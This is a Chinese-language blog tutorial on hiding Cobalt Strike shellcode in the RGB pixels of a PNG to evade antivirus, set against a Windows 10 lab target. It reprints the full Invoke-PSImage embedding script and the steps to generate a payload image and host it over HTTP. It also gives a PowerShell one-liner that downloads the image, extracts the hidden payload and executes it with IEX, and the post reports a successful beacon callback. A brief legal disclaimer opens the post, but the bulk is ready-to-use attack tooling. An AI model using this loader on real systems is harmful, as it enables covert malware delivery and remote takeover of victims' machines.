---
titel: Shellcode 隐写像素RGB免杀上线 CobaltStrike
typora-root-url: ../
---

本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

<div style="text-align: right"> 小维</div>

#### 写在前面

看到一篇推文隐写RGB来进行绕过杀软，记录一下~

<!--more-->

#### 环境介绍

```
攻击机地址：10.10.10.2
cobaltstrike v4.1

VPS地址：*.*.*.*

靶机系统: Windows 10
靶机地址: 10.10.10.131
```

#### 隐写RGB示例

##### Invoke-PSImage下载

```
下载地址： https://github.com/dayuxiyou/Invoke-PSImage
```

Invoke-PSImage.ps1

```powershell
function Invoke-PSImage
{
<#
.SYNOPSIS

Embeds a PowerShell script in an image and generates a oneliner to execute it.
Author:  Barrett Adams (@peewpw)

.DESCRIPTION

This tool can either create an image with just the target data, or can embed the payload in
an existing image. When embeding, the least significant 4 bits of 2 color values (2 of RGB) in
each pixel (for as many pixels as are needed for the payload). Image quality will suffer as
a result, but it still looks decent. The image is saved as a PNG, and can be losslessly
compressed without affecting the ability to execute the payload as the data is stored in the
colors themselves. It can accept most image types as input, but output will always be a PNG
because it needs to be lossless.

.PARAMETER Script

The path to the script to embed in the Image.

.PARAMETER Out

The file to save the resulting image to (image will be a PNG)

.PARAMETER Image

The image to embed the script in. (optional)

.PARAMETER WebRequest

Output a command for reading the image from the web using Net.WebClient.
You will need to host the image and insert the URL into the command.

.PARAMETER PictureBox

Output a command for reading the image from the web using System.Windows.Forms.PictureBox.
You will need to host the image and insert the URL into the command.

.EXAMPLE

PS>Import-Module .\Invoke-PSImage.ps1
PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\evil-kiwi.png -Image .\kiwi.jpg 
   [Oneliner to execute from a file]
   
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Script,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Out,
    
        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Image,

        [switch] $WebClient,
        
        [switch] $PictureBox
    )
    # Stop if we hit an error instead of making more errors
    $ErrorActionPreference = "Stop"

    # Load some assemblies
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")
    
    # Normalize paths beacuse powershell is sometimes bad with them.
    if (-Not [System.IO.Path]::IsPathRooted($Script)){
        $Script = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Script))
    }
    if (-Not [System.IO.Path]::IsPathRooted($Out)){
        $Out = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Out))
    }

    $testurl = "http://example.com/" + [System.IO.Path]::GetFileName($Out)

    # Read in the script
    $ScriptBlockString = [IO.File]::ReadAllText($Script)
    $in = [ScriptBlock]::Create($ScriptBlockString)
    $payload = [system.Text.Encoding]::ASCII.GetBytes($in)

    if ($Image) {
        # Normalize paths beacuse powershell is sometimes bad with them.
        if (-Not [System.IO.Path]::IsPathRooted($Image)){
            $Image = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Image))
        }
        
        # Read the image into a bitmap
        $img = New-Object System.Drawing.Bitmap($Image)

        $width = $img.Size.Width
        $height = $img.Size.Height

        # Lock the bitmap in memory so it can be changed programmatically.
        $rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
        $bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
        $ptr = $bmpData.Scan0

        # Copy the RGB values to an array for easy modification
        $bytes  = [Math]::Abs($bmpData.Stride) * $img.Height
        $rgbValues = New-Object byte[] $bytes;
        [System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);

        # Check that the payload fits in the image 
        if($bytes/2 -lt $payload.Length) {
            Write-Error "Image not large enough to contain payload!"
            $img.UnlockBits($bmpData)
            $img.Dispose()
            Break
        }

        # Generate a random string to use to fill other pixel info in the picture.
        # (Calling get-random everytime is too slow)
        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)
        
        # loop through the RGB array and copy the payload into it
        for ($counter = 0; $counter -lt ($rgbValues.Length)/3; $counter++) {
            if ($counter -lt $payload.Length){
                $paybyte1 = [math]::Floor($payload[$counter]/16)
                $paybyte2 = ($payload[$counter] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            } else {
                $paybyte1 = ($randb[$counter%113] -band 0x0f)
                $paybyte2 = ($randb[($counter+1)%67] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            }
            $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
            $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
            $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
        }

        # Copy the array of RGB values back to the bitmap
        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
        $img.UnlockBits($bmpData)

        # Write the image to a file
        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()
        
        # Get a bunch of numbers we need to use in the oneliner
        $rows = [math]::Ceiling($payload.Length/$width)
        $array = ($rows*$width)
        $lrows = ($rows-1)
        $lwidth = ($width-1)
        $lpayload = ($payload.Length-1)

        if($WebClient) {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } elseif($PictureBox) {
            $pscmd = "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } else {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G-band15))}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        }

        return $pscmd

    } else {
        # Decide how large our image needs to be (always square for easy math)
        $side = ([int] ([math]::ceiling([math]::Sqrt([math]::ceiling($payload.Length / 3)) + 3) / 4)) * 4

        # Decide how large our image needs to be (always square for easy math)
        $rgbValues = New-Object byte[] ($side * $side * 3);
        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)

        # loop through the RGB array and copy the payload into it
        for ($counter = 0; $counter -lt ($rgbValues.Length); $counter++) {
            if ($counter -lt $payload.Length){
                $rgbValues[$counter] = $payload[$counter]
            } else {
                $rgbValues[$counter] = $randb[$counter%113]
            }
        }

        # Copy the array of RGB values back to the bitmap
        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rgbValues.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $rgbValues.Length)
        $img = New-Object System.Drawing.Bitmap($side, $side, ($side*3), [System.Drawing.Imaging.PixelFormat]::Format24bppRgb, $ptr)

        # Write the image to a file
        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr);
        
        # Get a bunch of numbers we need to use in the oneliner
        $array = ($side*$side)*3
        $lrows = ($side-1)
        $lwidth = ($side-1)
        $width = ($side)
        $lpayload = ($payload.Length-1)

        if($WebClient) {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"$testurl`"));`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } elseif($PictureBox) {
            $pscmd = "sal a New-Object;Add-Type -A System.Windows.Forms;(`$d=a System.Windows.Forms.PictureBox).Load(`"$testurl`");`$g=`$d.Image;`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        } else {
            $pscmd = "sal a New-Object;Add-Type -A System.Drawing;`$g=a System.Drawing.Bitmap(`"$Out`");`$o=a Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[(`$_*$width+`$x)*3]=`$p.B;`$o[(`$_*$width+`$x)*3+1]=`$p.G;`$o[(`$_*$width+`$x)*3+2]=`$p.R}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
        }

        return $pscmd
    }
}

```

##### CS生成Shellcode

Attacks >>  Packages >> Payload Generator  生成Shellcode 

![image-20210416092120420](/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210416092120420.png)

##### 生成Shellcode图片

```powershell
# 1、设置策略不受限制，范围为当前用户；可get-ExecutionPolicy-List查看当前策略
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
# 2、导入下载的Invoke-PSimage.ps1模块
Import-Module .\Invoke-PSimage.ps1
# 3、生成 shellcode 的图片
Invoke-PSImage -Script .\payload.ps1 -Image .\2021.jpg -Out .\2021.png -Web
# 参数介绍
-Script [filepath]嵌入到图像中的脚本的路径。
-Out [filepath]将结果图像保存到的文件（图像将为PNG）
-Image [filepath]要嵌入脚本的图像。
-Web 输出用于使用Net.WebClient从Web读取图像的命令。
```

![image-20210415202230131](/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210415202230131.png)

##### HTTP服务

将生成的图片放在HTTP服务，这里用python3起了个HTTP服务

![image-20210415202655248](/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210415202655248.png)

##### 效果

靶机机powershell运行命令，成功上线。

```powershell
# http://example.com/2021.png 替换你图片地址

sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://example.com/2021.png"));$o=a Byte[] 3696;(0..20)|%{foreach($x in(0..175)){$p=$g.GetPixel($x,$_);$o[$_*176+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3598]))
```

![image-20210415201441673](/img/Shellcode%20%E9%9A%90%E5%86%99%E5%83%8F%E7%B4%A0RGB%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%88%B0%20CobaltStrike/image-20210415201441673.png)

#### 参考

https://github.com/dayuxiyou/Invoke-PSImage

https://www.freebuf.com/articles/web/262978.html



